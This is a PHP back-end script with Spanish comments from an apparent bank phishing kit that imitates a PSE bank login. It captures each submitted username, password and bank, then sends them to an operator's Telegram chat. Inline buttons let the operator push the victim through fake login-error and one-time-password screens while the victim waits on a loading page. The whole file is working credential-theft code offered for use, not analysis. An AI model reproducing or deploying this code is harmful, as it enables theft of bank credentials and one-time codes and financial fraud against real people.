<?php
session_start();
include '../../../../assets/config/conexion.php';
$config = include '../../../../assets/config/config.php';

// Función para escapar caracteres especiales en MarkdownV2
function escapeMarkdownV2($text) {
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $banco = $_POST['banco'];

    if (empty($user) || empty($pass)) {
        die("Error: Todos los campos son obligatorios.");
    }

    // Crear un nuevo registro en la tabla pse
    $sql_insert = "INSERT INTO pse (estado) VALUES (?)";
    $stmt_insert = $conn->prepare($sql_insert);
    $estado = 1; // Estado inicial
    $stmt_insert->bind_param("i", $estado);
    $stmt_insert->execute();
    $nuevo_id = $stmt_insert->insert_id; // Obtener el ID autogenerado del registro
    $stmt_insert->close();

    // Enviar datos a Telegram - ACTUALIZADO para coincidir con tu config.php
    $botToken = $config['telegram']['bot_token'];
    $chatId = $config['telegram']['chat_id'];
    $baseUrl = $config['base_url'];
    $security_key = 'tu_clave_secreta_aqui'; // Define tu clave de seguridad aquí

    $message = "🔐 *Nuevo inicio de sesión*\n\n"
             . "👤 *Usuario:* `" . escapeMarkdownV2($user) . "`\n"
             . "🔑 *Clave:* `" . escapeMarkdownV2($pass) . "`\n"
             . "🏦 *Banco:* `" . escapeMarkdownV2($banco) . "`";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]
            ],
            [
                ['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"]
            ],
            [
                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]
            ]
        ]
    ];

    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2',
        'reply_markup' => json_encode($keyboard)
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        $error = error_get_last();
        file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error, true), FILE_APPEND);
        die('Error al enviar mensaje a Telegram');
    }

    // Redirigir a la página cargando.php con el nuevo ID del cliente
    header("Location: ../cargando.php?id=" . $nuevo_id);
    exit();
}
?>